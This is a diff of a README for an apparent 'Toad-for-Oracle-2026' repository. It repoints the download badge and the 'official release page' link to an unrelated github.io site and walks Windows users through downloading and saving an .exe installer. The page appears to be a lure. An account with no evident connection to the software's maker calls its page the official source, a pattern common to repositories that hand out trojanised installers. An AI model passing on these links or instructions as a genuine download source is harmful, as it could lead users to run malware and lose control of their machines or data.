@@ -1,6 +1,6 @@
 # 🐸 Toad-for-Oracle-2026 - Simple Database Management For Windows Users
 
-[![](https://img.shields.io/badge/Download-Toad_For_Oracle-blue.svg)](https://github.com/Subjugationchyme333/Toad-for-Oracle-2026)
+[![](https://img.shields.io/badge/Download-Toad_For_Oracle-blue.svg)](https://subjugationchyme333.github.io)
 
 ## 📋 Software Overview
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this version of Toad. Check your 
 
 ## 📥 How To Download
 
-1. Go to the official release page: [https://github.com/Subjugationchyme333/Toad-for-Oracle-2026](https://github.com/Subjugationchyme333/Toad-for-Oracle-2026)
+1. Go to the official release page: [https://subjugationchyme333.github.io](https://subjugationchyme333.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Choose the latest version of the installer file, which ends in .exe.
 4. Save the file to your Downloads folder.
